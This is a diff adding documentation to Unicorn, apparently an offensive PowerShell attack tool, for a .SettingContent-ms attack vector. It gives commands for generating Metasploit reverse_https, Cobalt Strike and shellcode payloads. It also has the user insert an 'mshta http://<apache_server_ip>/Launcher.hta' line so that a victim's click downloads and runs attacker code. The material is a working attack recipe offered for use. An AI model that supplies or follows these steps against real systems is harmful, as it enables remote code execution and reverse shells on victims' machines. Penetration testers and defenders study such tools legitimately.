@@ -264,3 +264,63 @@ typedef struct _UNICODE_STRING {
 
 For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no  
 issues.
+
+###                 -----SettingContent-ms Extension Method----
+
+
+First, if you haven't had a chance, head over to the awesome SpectreOps blog from Matt Nelson (enigma0x3):
+
+https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39
+
+This method uses a specific file type called ".SettingContent-ms" which allows for the ability for both
+direct loads from browsers (open + command execution) as well as extension type through embedding in 
+office products. This one specifically will focus on extension type settings for command execution
+within Unicorn's PowerShell attack vector.
+
+There are multiple methods supported with this attack vector. Since there is a limited character size
+with this attack, the method for deployment is an HTA. 
+
+For a detailed understanding on weaponizing this attack visit:
+
+https://www.trustedsec.com/2018/06/weaponizing-settingcontent/
+
+The steps you'll need to do to complete this attack is generate your .SettingContent-ms file from
+either a standalone or hta. The HTA method supports Metasploit, Cobalt Strike, and direct
+shellcode attacks.
+
+The four methods below on usage: 
+
+HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
+HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms
+HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms
+Generate .SettingContent-ms: python unicorn.py ms
+
+The first is a Metasploit payload, the second a Cobalt Strike, the third your own shellcode, and the fourth
+just a blank .SettingContent-ms file. 
+
+When everything is generated, it will export a file called Standalone_NoASR.SettingContent-ms either in
+the default root Unicorn directory (if using the standalone file generation) or under the hta_attack/
+folder. You will need to edit the Standalone_NoASR.SettingContent-ms file and replace:
+
+REPLACECOOLSTUFFHERE
+
+With:
+
+mshta http://<apache_server_ip_or_dns_name/Launcher.hta.
+
+Then move the contents of the hta_attack to /var/www/html.
+
+Once the victim either clicks the .SettingContent-ms file, mshta will be called on the victim machine
+then download the Unicorn HTA file which has the code execution capabilites. 
+
+Special thanks and kudos to Matt Nelson for the awesome research
+
+Also check out: https://www.trustedsec.com/2018/06/weaponizing-settingcontent/
+
+Usage: 
+
+python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
+python unicorn.py <cobalt_strike_file.cs cs ms
+python unicorn.py <patth_to_shellcode.txt>: shellcode ms
+python unicorn.py ms
+
